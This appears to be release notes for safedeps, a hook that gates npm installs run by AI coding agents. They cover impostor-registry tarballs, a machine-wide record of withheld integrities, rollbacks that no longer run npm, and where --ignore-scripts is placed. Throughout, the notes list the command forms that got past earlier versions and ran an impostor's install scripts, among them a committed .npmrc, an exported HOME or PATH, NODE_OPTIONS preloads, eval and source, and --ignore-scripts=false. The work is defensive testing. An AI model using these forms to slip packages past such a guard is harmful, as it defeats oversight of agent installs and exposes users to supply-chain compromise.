Bundling read from the tree was measured the same way (macOS, npm 11.19.0). A nested sd-swapped@1.0.0 sent to an http tarball by a committed lockfile is installed with a warning and no script run, whether the record also says `inBundle` (NB1) or the root bundles its parent (NB2 under `npm ci`, NB2i under `npm install`, NB2n under `npm install --no-save`). A public package that bundles a dependency is rebuilt quietly, with `bundleDependencies` (BD1) or `bundledDependencies: true` (BD2), and one whose bundled record names another source is not (NB3). The Codex rollback row (RB1x) holds the message to saying that the install's own scripts already ran. On the tree before the change NB1, NB2, NB2i and NB2n ran the impostor's three scripts and the section failed 17 expectations; trusting `inBundle` again turns the same four red, NB3 with them (14 expectations).

### A record on the public registry is not where the bytes came from

The rebuild's whole-tree check and the source check took a `resolved` URL on `https://registry.npmjs.org/` for the public registry. npm's default `replace-registry-host=npmjs` fetches such a URL from whatever registry npm is configured with, and records the URL unchanged. So a committed `.npmrc` with `registry=<anywhere>` sent an approved name and version to another tarball: in a new project (RH1), and in a clone whose committed lockfile carried only the impostor's integrity (RH2). So did `npm_config_registry` in front of the command (RH3). Both lockfiles recorded the public URL, nothing was rolled back or warned about, and the inert install's rebuild ran the impostor's scripts. The claim above, that a new project's first install of a private-registry source is rolled back, did not hold for this case.

Where npm fetches from is now asked of npm, the way where an install lands is:

- The pre-guard asks `npm config ls --json` beside `npm prefix` and `npm root`: in the same directory, with the statement's own arguments and environment, under the same deadline. The answer does not deny the install: a company registry, a mirror and a proxy are set up through a project or user `.npmrc` or `npm_config_registry`, and there is no way yet to approve one. Only a `--registry` the command spells out is still denied, by the text check that was there before. In a workspace member npm refuses `npm config` (ENOWORKSPACES), so the question is asked at the root npm names, which is where the install reads its project configuration.
- The post hook asks again, in the directory it read, after the command. A public URL vouches for the public registry only when both answers say npm fetched it from there. An `.npmrc` the command wrote itself is seen there. Where either answer names a registry outside the public ones, the install is kept, nothing is rebuilt, and nothing is rolled back. The warning names the registry, says that is why the scripts were not run, and tells the agent to confirm with the user before running `npm rebuild <pkg>` itself. On Codex the install's own scripts ran before the hook, and the warning says that instead.
- A missing answer is never filled with a default. npm missing, failing or late, and an earlier statement that can change npm's environment unseen (`source`, `.`, `eval`, `set -a`, `declare -x`, a lone `npm_config_*` assignment), each leave the answer unknown. An unknown answer skips the rebuild with a warning that names the reason (RH7), and it is not a reason to roll back.
- The test batteries' local registry passes only by name. `SAFEDEPS_NPM_TEST_REGISTRY` takes one loopback URL, and every run that sets it says so in `advisory.log`, with the moved advisory sources.

What users see change: an npm install from a registry outside the public ones, set in an `.npmrc` or the environment, is not blocked. What that registry serves under a public-registry URL is installed, but on Claude Code its install scripts no longer run until someone who trusts the registry runs `npm rebuild` by hand. A company registry, a mirror or a proxy of the public registry is in that position too. A registry approval path is planned for the next release. A command that sources a file or uses `eval` before an npm install gets no automatic rebuild.

Boundaries: a registry set where neither ask can see it is in neither answer. That is the environment of the agent's shell when the hook processes do not share it, and an `.npmrc` the command writes and removes again. There the rebuild runs whatever that registry served. ARCHITECTURE tables each lockfile field the rebuild's check reads, what it cannot vouch for, and the row that holds it.

Verification: `scripts/test/effect-trace-grid.sh` section 1d, with a second fixture registry on 127.0.0.1 that serves the impostor (macOS 15.6.1, npm 11.19.0). RH1, RH2, RH3, RH3e, RH8 (a workspace member under a root `.npmrc`), RH1w (an `.npmrc` the command wrote) and RH2w are kept, nothing is rolled back, no script runs, and the warning names the evil registry and tells the agent to confirm with the user before rebuilding. A Codex RH3 is kept with the warning that the install's own scripts already ran. RH7 (`source`) is kept with a warning that names the unknown answer. RH4 (`--registry` on the command line) is denied before anything installs. RH5, an approved install from the sandbox registry, is rebuilt. On the final tree the grid passes in 379s at load 5 to 6, and smoke and lockless-forms pass beside it. Before the change, on 3e22fbc with the new rows, RH1, RH2, RH3, RH3e, RH8, RH1w, RH2w and RH7 each ran the impostor's three scripts (32 failed expectations). The denying design that came first (5566cc0), run against these rows, fails 10 expectations: it denies RH1, RH2, RH3, RH3e, RH8 and the Codex RH3, rolls back RH1w, and its warnings for RH1w, RH2w and RH7 neither name the registry nor say to ask. Ignoring npm's answer and trusting the public URL alone turns all eight kept rows red again, because the rebuild runs the impostor's scripts in each, and the Codex RH3 loses its warning (25 failed expectations). The control and the mutation ran side by side, at load 4 to 12. The first, denying version of this change also passed e2e and install-dir-differential on the same host; this round ran only the batteries it touches. Linux and npm 10.8.2 were not measured.

### Where bytes came from is recorded when they are fetched

The change above judges the command that fetched the bytes, and nothing told the next command. Once the setting that fetched an impostor was gone, the next command rebuilt it and ran its scripts: an approved install after a one-shot `npm_config_registry` (P1), a bare `npm install` after the `.npmrc` was removed (P2), an `npm ci` after `node_modules` was removed, served from npm's cache by integrity (P3), a rollback to a snapshot confirmed with the impostor in it (P4), and another project's `npm ci` of the same lockfile on the same machine (P5). Stripping `integrity` from both lockfiles did it too (P7). This was the third counterexample of one kind in a row: `inBundle`, `resolved` and the configuration at rebuild time each answered "where did these bytes come from" with a value not bound to the bytes.

- The post hook now records the fact when it sees the fetch. Each integrity an install brings into either lockfile, where npm did not say it fetched those bytes from the public registry, goes into `~/.safedeps/npm-withheld` with the package, where it came from and the first project. Both engines write it, before any rollback. It is machine-wide, because npm's cache carries bytes to other projects by integrity, and its path comes only from `SAFEDEPS_HOME`.
- The whole-tree check refuses a package that holds a recorded integrity, and a public-registry record with no integrity. The rebuild is skipped, nothing is rolled back, and the warning names the registry and the project that first fetched the bytes and tells the agent to ask the user before rebuilding. A record that cannot be read skips the rebuild with the reason.
- The record is released only by the bytes leaving the tree (P6). There is no command to release it in this version.
- "Brings in" is measured against the installed tree from before the command, one digest at a time. The first version of the record also left out every integrity the committed `package-lock.json` named, on the reasoning that bytes already on record are the same from any registry. A committed record is not a fetch anyone saw, so a clone's `npm ci` through a committed `.npmrc` or a one-shot `npm_config_registry` recorded nothing while its own warning named the impostor's registry, and the next command rebuilt the impostor: a bare `npm install` (Q1), an approved install (Q2), an `npm ci` from the cache (Q3) and another project's `npm ci` (Q4). An integrity that paired the impostor's sha512 with a digest the tree already held passed whole (Q5), because npm accepts any digest of the strongest algorithm. The cost: the first `npm ci` of a clone that installs from a company registry records its bytes.
- The tree from before the command counts only as far as the gate observed it. The next version of the record took the pre-guard's copy of `node_modules/.package-lock.json` as that tree, and the file is a record anyone can commit, too. A clone that carried only that file, naming the impostor's integrity, had its first fetch from the impostor left out while the warning named the registry, and the same four commands rebuilt the impostor (HL1-HL4). The post hook now keeps, per project directory, the sha256 of the last tree record it judged there (`~/.safedeps/npm-observed`), and the copy counts only when it matches. Within it, an entry vouches only when it names one digest: an entry pairing the impostor's sha512 with the public one, installed from the public registry, vouched for the impostor's (DP1). The cost: an install whose answer is unknown records every package of a tree the hooks have not observed, public ones included, so one `set -a && npm ci` in a fresh clone, or the first such install in a project after upgrading, withholds that whole tree on the machine (UK0a, UK1a). After an ordinary install there, it records only what it brings in (UK2).
- An install after code the command ran first records nothing. `source ~/.nvm/nvm.sh && npm ci` left npm's answer unknown, so under the rule above it withheld every package of the tree on the machine (UK0, UK1). Whoever controls the code `source`, `.` and `eval` run already runs code in the agent's shell, so the record protected nothing against them. The pre-guard now marks that unknown answer `cause: "sourced"` when code is the only reason and npm answered for everything else. The install's scripts are still withheld for that command, with a warning that says why, but nothing is recorded and the tree is not left observed, so the next install npm answers for with the public registry rebuilds it. A setting the gate reads but cannot reproduce (`set -a`, `declare -x`, an `npm_config_*` assignment) is still recorded, alone or beside a `source`.
- A registry npm names stands after code too. The first version of that exemption replaced every answer npm gave after `source`, `.` or `eval` with the sourced unknown. So `. /dev/null; npm_config_registry=<impostor> npm install x`, `eval true; export …` and `source /dev/null && export …` recorded nothing, although npm had named the impostor from the command's own words, and the next approved install rebuilt the impostor's three scripts (VB1-VB3). The exemption now holds only where npm answered the public registry. An answer that names another registry stands and is recorded, as P1's and EXP1's are. Code whose own text names an `npm_config_*` setting, such as `eval "export npm_config_registry=…"`, counts as a setting the gate reads but cannot reproduce, and is recorded (EV1).
- What a command exports is in the ask whatever its name. The pre-guard carried a statement's own assignments to npm's ask whatever they named, but an export only when it named an `npm_config_*` setting. npm reads its user `.npmrc` from `HOME`, so `export HOME=<dir>; npm install x`, the same with `&&`, and `HOME=<dir>; export HOME; …` were asked about under the hook's `HOME`. Both asks answered the public registry, and the first command rebuilt the scripts of what the registry in `<dir>/.npmrc` served (XH1-XH3). `declare -x HOME=<dir>` left the answer unknown and was recorded (XH4). Now `export`, `declare -x` and a bare `export NAME` after an assignment carry every name with a literal value, the set a statement's own prefix carries. So does an assignment on a line of its own, because `HOME` is exported already (XH5). Where such an assignment does not reach npm, npm runs with the hook's environment, which the post hook asks with. An export whose value the shell decides at run time leaves the answer unknown and is recorded (XU1). A `declare -x` that changes the value it stores, such as `declare -xi`, is still a setting the gate cannot reproduce (UK1d). The cost: `export PATH="…:$PATH" && npm ci` now has an unknown answer too, and in a tree the hooks have not observed it records every package.
- Asking npm runs none of the command's code. The ask carried the command's own `PATH`, `NODE_OPTIONS` and npm word, so `PATH=<dir> npm install x`, `NODE_OPTIONS=--require=<file> npm install x` and `<dir>/npm install x` ran the command's code three times per judgment, before the gate had decided anything, and a command it then denied ran it all the same. The question that brought this in is this release's, so it is closed before the release. The ask now always runs the hook's own npm on the hook's `PATH`, and never carries a name that chooses code when npm starts: `PATH`, `NODE_OPTIONS`, `NODE_PATH`, `OPENSSL_CONF`, `OPENSSL_MODULES`, `LD_*`, `DYLD_*`, `BASH_ENV` and `npm_config_node_options`. A command that sets or unsets one of them, runs `env -i`, or names an npm by a path that is not the hook's own is code it chooses for npm, the same kind as `source`: where npm answers the public registry, that command's scripts are withheld with a warning and nothing is recorded, and where npm names another registry its answer stands and is recorded. That also lifts the cost above: `export PATH="…:$PATH" && npm ci` no longer records the tree. `unset NAME` is carried to the ask as `env -u NAME`. The cost: `NODE_OPTIONS=--max-old-space-size=4096 npm ci` gets no automatic rebuild.

What users see change: a package fetched once through a registry outside the public ones, a mirror included, is not rebuilt automatically in any project on the machine, because a mirror serves the same bytes as the public registry. Nothing is blocked. Approving a registry, with a check that compares a recorded integrity with the public registry's `dist.integrity`, is planned for the next release and will lift that cost.

Boundary: bytes the gate never saw fetched. An install outside the hooks, one the command hook did not recognize or recorded `UNGATED`, and a registry neither of npm's answers can see put bytes in npm's cache unrecorded, and a lockfile naming their integrity installs them from there. Bytes a clone carries inside `node_modules` are outside the record as well, because nothing fetched them. So are bytes fetched after `source`, `.` or `eval` where npm answered the public registry: if a sourced file pointed npm at another registry, the next install that npm answers for with the public registry rebuilds what it served (VB4). The record's `resolved` does not stop it when that registry serves registry.npmjs.org URLs. That is chosen, since whoever controls that code already runs code in the agent's shell. The same holds for the configuration only an npm the command chooses reads, through a `PATH` of its own or a path to npm: safedeps asks its own npm, and whoever chose the other one already runs it.

Verification: `scripts/test/effect-trace-grid.sh` section 1d, against a real npm, the sandbox registry and a second fixture registry that serves the impostor. The tree was run on macOS 15.6.1, node v26.7.0, npm 11.19.0, under `nice`, with load from 3.8 to 17.8. P1-P5, P1x (a Codex install, then a Claude one) and PU (an install after `source`) are kept with nothing rebuilt and a warning that names the registry, or the unknown answer, and the project that first fetched the bytes. P4 rolls back to the confirmed snapshot and rebuilds nothing. P7 is kept with the no-integrity warning. P0 and P6 are rebuilt quietly. The grid passed with 0 failures in 477s, lockless-forms with 0 in 340s, and smoke passed. The tree before the change (104a2fa) with the new battery failed 24 expectations: three in each of P1, P1x, P2, P3, P4, P5, P7 and PU, every one of them running the impostor's three scripts, while P0 and P6 passed. Three mutations each turned red only where expected: without the record lookup, P1-P5, P1x and PU (21); without the no-integrity condition, P7 (3); with the record keyed per project, P5 (3). On Linux (bash 5.2.37, node v20.20.2, npm 10.8.2, load under 2) the grid and lockless-forms passed with 0 failures each. That run first found a pre-guard crash from the previous change: the per-statement reader left `fetch` unset for a statement that ended early, such as the `printf` in `printf 'save=false\n' > .npmrc && npm install x`. bash 5 aborts on an unset variable under `set -u`, so every such command was denied fail-closed and both batteries died at their first such form, while bash 3.2 on macOS read it as empty. It is reset with the statement's other fields now.

Verification of the narrowed record: rows Q1-Q5 in section 1d. Each tree ran on Linux (bash 5.2.37, node v20.20.2, npm 10.8.2) and on macOS (bash 3.2.57, node v26.7.0, npm 11.19.0), under `nice`, one after another. The fixed tree passed the whole grid with 0 failures on both: in 574s on Linux (load 0.7 to 6.1) and in 466s on macOS (load 6.9 to 4.0). Q1-Q5 are kept with nothing rebuilt and the warning that names the registry and the project that first fetched the bytes. The public clone's first `npm ci` is rebuilt quietly (K1). The tree before the change (d669147) with the new battery failed 15 expectations on both hosts, three in each of Q1-Q5, every one running the impostor's scripts. Two mutations turned red only where expected, on both hosts: putting the committed `package-lock.json` back among the earlier records failed Q1-Q5 (15), and matching a whole entry by any one digest failed Q5 (3). The control and the two mutations ran with section 1's rows left out. A first macOS attempt under npm 11.4.2 failed every install in section 1 before reaching these rows, and was discarded.

Verification of the observed tree record: rows HL1-HL4, DP1 and UK0-UK2 in section 1d. The fixed tree passed the whole grid and lockless-forms with 0 failures on Linux (bash 5.2.37, node v20.20.2, npm 10.8.2; grid 632s, lockless-forms 378s, load 1.6 to 6.9) and on macOS (bash 3.2.57, node v26.7.0, npm 11.19.0; grid 711s, lockless-forms 480s, load 14 to 59). HL1-HL4 and DP1 are kept with nothing rebuilt and the warning that names the registry. The public clone's first `npm ci` is rebuilt quietly (K1), and so is an approved install after an unknown one in an observed tree (UK2), which also shows that the tree record the rebuild leaves behind still matches the hash. The tree before the change (4f61bba) with the new battery failed 17 expectations on both hosts: three in each of HL1-HL4 and DP1, every one running the impostor's three scripts, and two in UK0, whose cost this change introduces. Two mutations turned red only where expected, on both hosts: trusting the pre-guard's copy unconditionally failed HL1-HL4 and UK0 (14), and letting an entry with two digests vouch failed DP1 (3). The control and the mutations ran with the rows of sections 1 and 1a left out. The rows got their final ids after these runs, a change of labels only, and section 1d then passed again with 0 failures on both hosts.

Verification of the record after sourced code: rows SRC1-SRC3, EXP1, UK0, UK1, UK0a, UK1a, UK1d, UK1v, MX1 and UK2 in section 1d. The fixed tree passed the whole grid with 0 failures on Linux (bash 5.2.37, node v20.20.2, npm 10.8.2; 662s, load 0.1 to 1.7) and on macOS (bash 3.2.57, node v26.7.0, npm 11.19.0; 747s, load 3.3 to 15.5). lockless-forms and smoke passed on both hosts with the same code: 380s and 61s on Linux, 340s and 65s on macOS. SRC1 (`source`), SRC2 (`.`) and SRC3 (`eval`) are kept with nothing rebuilt. The warning says why, and the record of withheld bytes and the observed tree hashes are unchanged. The next ordinary install in the same project rebuilds sd-approved. UK0 and UK1 are now rebuilt in the other project. UK0a, UK1a, UK1d, UK1v, MX1 and EXP1 are still kept with the record's warning. PU, which pinned the record after `source`, was removed with the record. The tree before the change (a523398) with the new battery failed 17 expectations on both hosts: SRC1-SRC3 (four each), UK0 and UK1 (two each), and MX1, whose warning named `source` rather than the `set -a` that keeps it recorded. Three mutations failed only where expected, on both hosts. Recording after sourced code again failed SRC1-SRC3, UK0 and UK1 (13), each SRC row through a file written to the record. Exempting every unknown answer failed UK0a, UK1a, UK1d, UK1v and MX1 (10). Leaving the tree observed failed SRC1-SRC3 (3). The control and the mutations ran with the rows of sections 1 and 1a left out.

Verification of the answer that stands after code: rows VB1-VB4 and EV1 in section 1d, beside SRC1-SRC3 and EXP1. On macOS 15.6.1 (bash 3.2.57, node v26.7.0, npm 11.19.0) the fixed tree passed the whole grid with 0 failures in 655s (load 4.6 to 12.7). Beside it, lockless-forms (23 ok, 401s), smoke (54 ok), scan-contract (43 ok) and consumer-forms (61 ok) passed, and the quick census counted zero weakened, mislabeled, after-gate and pending-on-deny (load 9 to 25). On Linux (bash 5.2.37, node v20.20.2, npm 10.8.2) the same batteries passed with the same counts: lockless-forms in 408s, consumer-forms in 558s, and the census at load 3.7 to 7.4. The grid's first Linux run (749s, load 0.9 to 1.2) passed every row but one check of VB4. That check read the record directories after the row's second install, which is public and leaves its tree observed, so it was a fault in the test. Read right after the first command, it passed on macOS and in the three Linux runs below. VB1-VB3 are kept with nothing rebuilt and the warning that names the registry and the project that first fetched the bytes. EV1 is kept with the record's warning for an unknown answer. SRC1-SRC3 are still rebuilt by the next ordinary install. VB4 pins the boundary: the first command records nothing, and the next approved install rebuilds the impostor's three scripts with no warning. The tree before the change (fd74e4c) with the new rows failed 12 expectations on both hosts, three in each of VB1-VB3 and EV1, every one running the impostor's scripts, while VB4 and SRC1-SRC3 passed. Two mutations failed only where expected, on both hosts. Exempting every answer npm gave after code failed VB1-VB3 (9). Ignoring an npm setting named in an `eval`'s text failed EV1 (3). The control and the mutations ran with the rows of sections 1 and 1a left out, at load 7 to 25 on macOS and 1 to 7 on Linux.

Verification of what an export carries: rows XH1-XH5, XC1-XC3 and XU1 in section 1d, with UK1d. They run with `npm_config_userconfig` unset and the sandbox userconfig at `$HOME/.npmrc`, because the variable outranks `HOME`, and a directory whose `.npmrc` names the impostor's registry. The fixed tree passed the whole grid with 0 failures on macOS 15.6.1 (bash 3.2.57, node v26.7.0, npm 11.19.0; 870s, load 16.5 to 19.3) and on Linux, Debian 13 (bash 5.2.37, node v20.20.2, npm 10.8.2; 817s, load 0.1 to 0.8). That Linux run includes the corrected VB4. On Linux lockless-forms (23 ok), smoke (54 ok), scan-contract (43 ok) and consumer-forms (61 ok) passed beside it, and the quick census counted zero weakened, mislabeled, after-gate and pending-on-deny (load 2.3 to 6.1). XH1-XH5 are kept with nothing rebuilt in the first command, and the next approved install is withheld with the warning that names the registry and the first project. XU1 is kept with the warning for an unknown answer. XC1-XC3 behave as before. The tree before the change (e965c09) with the new rows failed 21 expectations on both hosts. Four each in XH1, XH2, XH3, XH5 and XU1, where the first command and the next approved install both ran the impostor's three scripts. One in XH4, which was recorded as an unknown answer and ran nothing. XC1-XC3 and UK1d passed there. Two mutations failed only where expected, on both hosts. Carrying only `npm_config_*` names in an export failed XH1, XH2, XH4 and XU1 (16); XH3 still passed, because the assignment before its `export HOME` is carried on its own. Not carrying an assignment on a line of its own failed XH5 (4). The control and the mutations ran the whole grid, at load 4 to 24 on macOS and 1 to 6 on Linux.

Verification that asking npm runs none of the command's code: lockless-forms section 1e (CX) and rows PX1-PX4 and UN1 in effect-trace-grid section 1d. The CX rows judge ten forms, each with an unapproved pinned spec, which must be denied, and an approved one, which must be let through. The forms put a fake npm first on a `PATH` (in front of npm, literal or not, exported, through env(1)), name it by its path, or preload a module through `NODE_OPTIONS` in four positions. Either piece of code appends a line to a file when it runs. The fixed tree left no line in any of the 20 judgments. On the tree before the change (3b4eee9) with the new rows, 16 of them left three lines each, one per ask, deny and allow alike. The four that left none are the `$PATH` forms, which the old ask never ran because their value is decided at run time. Two mutations failed only where expected. Leaving out the code names and the hook's own `PATH` (A2) failed the three literal `PATH` forms and the four `NODE_OPTIONS` forms (14 judgments). The npm named by its path stays clean there, because the pre-guard no longer hands the ask its npm word. Leaving out the code names alone (A) failed only the `NODE_OPTIONS` forms (8 judgments): the hook's `PATH` goes last in the ask and holds the `PATH` forms on its own. lockless-forms ran on macOS (bash 3.2.57, node v26.7.0, npm 11.19.0): the fix passed with 24 ok on two machines, in 367s (load 7.4 to 11.0) and in 391s (load 8.7 to 13.2); the control and the mutations ran at load 5 to 10. On Linux (Debian 13, bash 5.2.37, node v20.20.2, npm 10.8.2) the fix passed with 24 ok in 426s, the control marked the same 16 judgments and A2 the same 14, at load 0.9 to 2.6. In the grid, PX1 (`export PATH="<dir>:$PATH" && npm ci`), PX2 (the same in front of npm) and PX3 (`NODE_OPTIONS=--max-old-space-size=4096 npm ci`) rebuild nothing in the first command, say why, and leave the record and the observed hashes unchanged, and the next ordinary install rebuilds. PX4 names the impostor's registry beside an exported `PATH` and is recorded. UN1 unsets the sandbox's `npm_config_userconfig` and is recorded. The fixed tree passed the whole grid with 0 failures on macOS (bash 3.2.57, node v26.7.0, npm 11.19.0; 694s, load 1.7 to 8.7) and on Linux (Debian 13, bash 5.2.37, node v20.20.2, npm 10.8.2; 823s, load 0.9 to 1.8). On macOS the tree before the change with the new rows failed 16 expectations: PX1 and PX2 four each (recorded, and the next install not rebuilt), PX3 three (the old ask carried `NODE_OPTIONS` and the first command rebuilt), PX4 one (recorded as an unknown answer, so the warning names no registry), and UN1 four (the impostor's three scripts ran in both commands). Reading the code names as ordinary names in the pre-guard, with the ask still dropping them (B), failed PX1-PX4 and nothing else (12), at load 8 to 16. smoke (54 ok), install-dir-differential (1 ok) and scan-contract (43 ok) passed on the first macOS machine. On Linux smoke (54 ok) and consumer-forms (61 ok) passed, and the quick census counted zero weakened, mislabeled, after-gate and pending-on-deny (load 0.9 to 2.6). e2e fails one check there ("post hook keeps verified inert rebuild success quiet") on 3b4eee9 as well; its cause is not known.

### A rollback runs no package manager

The rollback used to finish by reinstalling `node_modules`: `npm ci` from the restored lockfile, or `rm -rf node_modules && npm install` without one. Some worktree layouts link a project's `node_modules` to another checkout's, and `npm ci` empties whatever `node_modules` resolves to before it installs. A rollback in such a worktree deleted the other checkout's packages.

Guarding the reinstall did not hold. Review found a new way out in each of three rounds, against a real npm: the walk up to an enclosing project where the directory has no `package.json`, a lockfile that is a link and is saved through by the fallback install, a workspace that lies outside the project, and a `file:` dependency whose bin links are rewritten in its own directory. The cause was the same each time. npm decides where its hands go, and the gate was predicting it.

So the rollback no longer runs npm:

- It restores the lock and manifest files it snapshotted, and removes the project's own `node_modules` when that is a real directory. Removing a real directory removes the links inside it, never what they point to.
- A target that is a symbolic link is refused and named. The message and `reorg.log` (`REORG REFUSED`) say which step was refused and where the link leads, as a physical path. The rollback goes on with the rest.
- `node_modules` is removed only when the command is seen to have written the project's node tree: an install trace, a node manifest or lockfile that differs from the snapshot taken just before the command, or a `node_modules` that lists a package or binary that snapshot did not, or is newer than it. The closure is judged whether or not the command changed it, so a command misread as an install, in a project whose closure was never approved, reached the rollback with nothing to roll back, and the removal took the project's dependencies with it. The reinstall the rollback used to run had been hiding that. Times are compared with `find -newer`: bash 3.2's `-nt` compares whole seconds, and a real `npm ci` that replaced a package in place finished inside the second the snapshot was taken in.
- The reinstall is the next install, which the gate checks like any other.
- The message says what the rollback did and what the files are now, and gives no command. Advice went wrong the same way the reinstall did: three rounds of review each found a recommended `npm ci` that reached outside, the last one from a workspace member, where a bare `npm ci` empties the workspace root. The interrupted-rollback report follows the same rule.
- Every sentence is a fact read from disk or a rule safedeps applied. "No lockfile" next to a `yarn.lock`, and "npm would work in an enclosing project" where a real npm stayed put, were each a fact with a prediction attached, and each was wrong.

What users see change: after a rollback the project has no `node_modules` until the next install. The rebuild after a verified inert install is the one place safedeps still runs npm, and it is skipped, with the link named as the reason, when `package.json`, a lockfile or `node_modules` at the project root is a link.

### What a rollback says is checked against the disk

A rollback message used to be prose. Three rounds of review found false clauses in it, and each had the same shape: safedeps ran a check or did something, and a result it had not checked followed. Reading the sentences by hand did not hold. After the third round, a judgment still measured six more false clauses.

So a rollback, a refused step, an unfinished rollback's report and a skipped rebuild now print a closed set of lines. Each line comes from a function that ran its own check, and says what safedeps did or what that check found: a file restored or not restored, removed or not removed, a step refused with the physical path a link leads to, whether a snapshot is confirmed, or "The rollback changed nothing." A restore that fails says so, and the rollback goes on. It used to stop the hook.

The check is on the output, not on the code. e2e hands every line the post hook prints to an oracle, and a row does not choose which lines are read. A line that matches no form fails the run. Each claim is checked again on disk by code that is not the hook's. The `reorg.log` entries are read with the same grammar, and a call that prints nothing must append nothing to `reorg.log`. Thirty-two mutations, run on copies, are each red at the oracle.

The `--ignore-scripts` line says what safedeps did, not what the command carried. It is one of three:

- "safedeps added --ignore-scripts to this install"
- "safedeps asked for --ignore-scripts on this install; the command this hook received is not the one safedeps wrote"
- "safedeps did not add --ignore-scripts to this install"

Reading the command for the flag went wrong three times in review, in the hook and the oracle at once, because both used one model of a shell statement. Now the pre-guard records the command it wrote, and a line is said only from a fact a version 2 record states. A v2.17.2 record, a missing one, or one the post hook cannot read gets no line, and `advisory.log` names it.

A record the post hook cannot use no longer ends the hook. A record whose snapshot has no meta file, one that names no snapshot, and one that is not one JSON object each used to end it with nothing said, and the install went unverified. Now the hook writes one `advisory.log` line and sends the command to the backstop. The confirmed snapshot is always picked by the hash of the project the hook judged, never by the hash a record holds.

Two boundaries are stated rather than closed. A record names no call: when two calls of the same command overlap in one directory, or an earlier call never reached its post hook, a post hook can use the other call's record. On Claude Code a failed tool call does not reach PostToolUse, so a failed install leaves its record behind; on Codex it does reach it. Tying records to the call is v2.18.1's work. Both engines send the same `tool_use_id` to both hooks, measured on Claude Code 2.1.288 and Codex 0.160.0.

### The backstop rolls back only a command that wrote the node tree

The backstop judges a command the pre-guard did not read as an install but whose text looks like one. It ran the closure check and rolled back on a failure, so `grep -n "npm install" README.md` rolled back any project whose closure had become unapproved outside the gate, after a pull or an expired approval, and removed its `node_modules`. An expired approval alone was enough; no pull was needed.

Now the backstop asks first whether this command wrote the project's node tree. Just before the command runs, the pre-guard records the inode and change time of both npm lockfiles, following links to their targets, and a baseline time. The post hook counts a lockfile whose inode or change time is not the recorded one, a lockfile that appeared or vanished, or anything under `node_modules` changed after the baseline (`find -H -cnewer`) as a trace. With a trace, the backstop rolls back as before. With none, it writes one `BACKSTOP UNTRACED` line to `advisory.log` and does nothing else.

The record is tied to the call. Both engines send the same `tool_use_id` to PreToolUse and PostToolUse, measured on Claude Code 2.1.288 and 2.1.289 and on Codex 0.160.0, and the pre-guard names the record by it. A call with a record is judged by its record alone, before any other state is read. A call with none counts as traced, which is the old behavior, and so does anything the check cannot settle: a missing baseline, a damaged record, or a walk of `node_modules` that fails or passes its five-second deadline. The baseline is set two seconds back only where the filesystem keeps whole seconds; set back everywhere, it counted a pull 0.3 seconds before a grep as the grep's write.

Review rejected this design three times before it held, each time on a record that did not describe the disk or did not belong to the call: the baseline set back everywhere, the oldest record read instead of the call's own, a linked lockfile read without following the link, and another call's install record read ahead of the call's own.

### The inert flag is placed where npm reads it, and safedeps does not claim it held

On Claude, the pre-guard adds `--ignore-scripts` to an approved npm install so the install's lifecycle scripts do not run before the closure is verified. It used to skip that when `--ignore-scripts` appeared anywhere in the command, so `npm install x --ignore-scripts=false` and `npm install x && echo --ignore-scripts` ran with scripts on and no record. It now reads each npm install statement's own arguments.

npm takes the last value of a setting, so a flag right after the verb loses to a later `=false`, and a flag at the end becomes the value of a trailing option such as `--cache`. The pre-guard places the flag, reads the statement again by npm's rules for npm 10 and 11, and keeps the first place where `ignore-scripts` is last and true and the command's other words keep their meaning. A statement that holds a word the shell decides at run time cannot be read that way. It gets the flag in two places, and `advisory.log` records it.

Every rewrite also keeps the release's own placement: at the end of a one-statement command, right after the verb in a compound one. Removing safedeps's other flags from a rewrite gives exactly what v2.17.2 wrote, and a check holds every rewrite in the test suite to the recorded output of the v2.17.2 hook. On scripts, no rewrite is worse than the release.

The reports stop saying that install scripts did not run. Whether the flag holds is decided at run time by shell state the command text does not show: functions and aliases from the agent shell's snapshot of the user's rc files, `.zshenv`, `BASH_ENV`, or an alias or function the command defines. A plain `npm install x` can run its scripts through one of these. So the reports say what safedeps did ("safedeps added --ignore-scripts to this install"), and add a warning only where safedeps could not read the statement. This design took three review rounds to reach: each round closed one class of run-time word (`$(…)`, then `~` and braces, then shell state), and the judgment that ended it found the claim, not the placement, was the defect.

### Manager names are read in any case

`PIP install x` and `Npm install x` run on macOS, whose filesystem ignores case. v2.17.2 denied them; the integration branch had started passing them with no record. A manager's name is now read in any case, as the recognizers already read it.

### Windows: the overrides lookup ends at a drive root (#21)

The npm `overrides` lookup walked up from the project and stopped only at `/` or a `.git`. `dirname C:` is `C:` in Git Bash, so outside a Git repository the loop never ended, the hook was killed at its timeout, and the install proceeded. It now stops where `dirname` returns its own input, the test the Yarn walk already used. On POSIX the same fixed point is `.`, and a function-level test pins both forms. Windows is still outside CI; the Windows behaviour rests on the report's trace.

### UNGATED is keyed on the effect gate being there (#22)

The record for an unpinned install used to be skipped whenever the ledger ecosystem was npm. pnpm, yarn and bun share that ecosystem without the `package-lock.json` the effect gate reads, so an unpinned `pnpm add x` left no trace. The exemption is now "the effect gate reads the result": an install into a project by the npm CLI. pnpm, yarn, bun, `npm i -g`, `--no-package-lock` and fetching runners are recorded, and a runner of a binary the project already has (`npx tsc`) fetches nothing and stays quiet. A package counts as pinned only when the extractor produced a spec for it, keyed by ecosystem and name, so a command that pins one package and not another, or pins a name in one ecosystem and installs it unpinned in another, is recorded too.

### Faster

- **The command scanner is linear.** It was a bash character loop that grew with the square of the command. v2.17.2 spent 36.2s on the scan alone at 32KB, past the 30s hook budget. On the release tree the scan alone takes 0.05s at 8KB, 0.12s at 32KB and 0.21s at 64KB on macOS (bash 3.2, the BSD `awk`), and 0.02s, 0.05s and 0.08s on Linux (bash 5.2, `mawk`). The rest of the guard is not linear everywhere yet. With the deadline off, a quiet command costs the whole gate 0.25s, 0.47s and 0.82s at those sizes on Linux, but 0.56s, 4.1s and 14.4s on macOS. At 64KB that is still inside the 20s self-budget, and a larger quiet command on macOS reaches it and is answered `UNDECIDED`.
- **An install-bearing command no longer goes quadratic.** Six "is this segment blank" checks used a bash pattern substitution that grows much faster than the text in bash 3.2, the macOS `/bin/bash` the hooks run under: 4.99s for one expansion of 2,000 bytes. An npm-install command of 4KB took 43s on the integration tree before the fix and 1s after. With the deadline off, an install-bearing command now costs 1.4s at 8KB, 2.3s at 32KB and 3.6s at 64KB on Linux, and 2.2s, 10.5s and 37.5s on macOS. Past the 20s self-budget the guard answers `UNDECIDED` long before the runtime would kill it, which on macOS happens between 32KB and 64KB.

